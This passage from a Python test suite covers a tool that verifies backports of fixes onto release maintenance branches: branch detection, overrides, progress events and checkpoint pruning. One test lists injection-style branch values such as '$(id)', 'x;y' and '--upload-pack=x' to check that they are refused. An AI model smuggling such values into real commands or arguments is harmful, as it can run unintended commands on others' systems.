    assert "--target-branch" in result.reason
    assert result.target_branch is None and sandbox.calls == []
    assert result.fixing_commit == FIX  # still reported


async def test_the_reason_names_maintenance_branches_of_other_versions() -> None:
    result, _ = await run(a=assessment(reported_ref="8.3.3"))
    assert result.status is BackportStatus.NOT_APPLICABLE
    assert "8.0.x, 8.1.x" in result.reason and result.candidate_branches == ["8.0.x", "8.1.x"]


async def test_a_reported_side_that_ran_a_branch_has_no_version_to_match() -> None:
    result, _ = await run(a=assessment(reported_ref="main"))
    assert result.status is BackportStatus.NOT_APPLICABLE and "not a release" in result.reason


async def test_a_swe_bench_style_assessment_has_no_repository() -> None:
    result, _ = await run(a=assessment(issue_url="swe-bench:psf__requests-2317"))
    assert result.status is BackportStatus.NOT_APPLICABLE


async def test_a_missing_reproduction_test_is_an_error() -> None:
    result, _ = await run(a=assessment(test_code=None))
    assert result.status is BackportStatus.ERROR and "no reproduction test" in result.reason


async def test_a_target_branch_override_beats_detection() -> None:
    result, sandbox = await run(target_branch="stable", a=assessment(reported_ref="9.3.1"))
    assert result.status is BackportStatus.VERIFIED and result.target_branch == "stable"
    assert result.target_branch_head == "e" * 40
    assert "e" * 40 in sandbox.calls[0].command


async def test_a_target_branch_override_works_without_a_version() -> None:
    result, _ = await run(target_branch="8.0.x", a=assessment(reported_ref="main"))
    assert result.status is BackportStatus.VERIFIED and result.target_branch == "8.0.x"


async def test_an_override_for_a_branch_that_does_not_exist_is_not_applicable() -> None:
    result, sandbox = await run(target_branch="7.x")
    assert result.status is BackportStatus.NOT_APPLICABLE
    assert "no branch named 7.x" in result.reason and sandbox.calls == []


@pytest.mark.parametrize("bad", ["--upload-pack=x", "a b", "x;y", "../x", "$(id)"])
async def test_an_odd_override_is_refused(bad: str) -> None:
    result, sandbox = await run(target_branch=bad)
    assert result.status is BackportStatus.ERROR and sandbox.calls == []


# -- plumbing ----------------------------------------------------------------------------------


async def test_progress_events_use_the_backport_stage() -> None:
    events: list[ProgressEvent] = []
    result, _ = await run(progress=events.append)
    assert result.status is BackportStatus.VERIFIED
    backport_events = [e for e in events if e.stage == "backport"]
    assert backport_events and backport_events[-1].message.startswith("verified:")
    assert any("Cherry-picking" in e.message for e in backport_events)


async def test_python_version_and_extra_packages_reach_the_baseline() -> None:
    result, sandbox = await run(python_version="3.9", extra_packages=["attrs>=23"])
    assert result.status is BackportStatus.VERIFIED
    assert "pip install 'attrs>=23'" in sandbox.calls[0].command
    assert sandbox.calls[0].image == "base:3.9"


async def test_the_result_round_trips_through_json() -> None:
    result, _ = await run()
    again = bp.BackportResult.model_validate_json(result.model_dump_json())
    assert again == result


def test_result_models_have_the_documented_statuses() -> None:
    assert {s.value for s in BackportStatus} == {
        "verified", "conflicts", "regression", "already_fixed_on_branch", "not_applicable", "error",
    }


# -- housekeeping --------------------------------------------------------------------------------


class PruningSandbox(ScriptedSandbox):
    """A scripted sandbox with the Docker backend's optional `prune_checkpoints`."""

    def __init__(self) -> None:
        super().__init__()
        self.pruned: list[int] = []

    async def prune_checkpoints(self, keep: int):
        from types import SimpleNamespace

        self.pruned.append(keep)
        return SimpleNamespace(removed=["old"], kept=["new"])


async def test_old_checkpoint_images_are_pruned_when_a_backport_ends() -> None:
    sandbox = PruningSandbox()
    result = await bp.backport(
        assessment(), sandbox=sandbox, list_branches=lister, settings=Settings(keep_checkpoints=3)
    )
    assert result.status is BackportStatus.VERIFIED and sandbox.pruned == [3]


async def test_a_backport_that_stops_early_still_prunes_what_it_built() -> None:
    sandbox = PruningSandbox()
    sandbox.world = World(pick=pick_conflict())
    result = await bp.backport(
        assessment(), sandbox=sandbox, list_branches=lister, settings=Settings()
    )
    assert result.status is BackportStatus.CONFLICTS and sandbox.pruned == [6]


async def test_a_backport_that_never_needed_a_sandbox_does_not_create_one(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def forbidden(_: object) -> object:
        raise AssertionError("no sandbox should be created for a not_applicable result")

    monkeypatch.setattr(bp, "get_sandbox", forbidden)
    result = await bp.backport(
        assessment(commit=None), list_branches=lister, settings=Settings()
    )
    assert result.status is BackportStatus.NOT_APPLICABLE


async def test_a_pruning_failure_never_changes_the_result() -> None:
    class Broken(PruningSandbox):
        async def prune_checkpoints(self, keep: int):
            raise RuntimeError("docker is gone")

    result = await bp.backport(
        assessment(), sandbox=Broken(), list_branches=lister, settings=Settings()
    )
    assert result.status is BackportStatus.VERIFIED
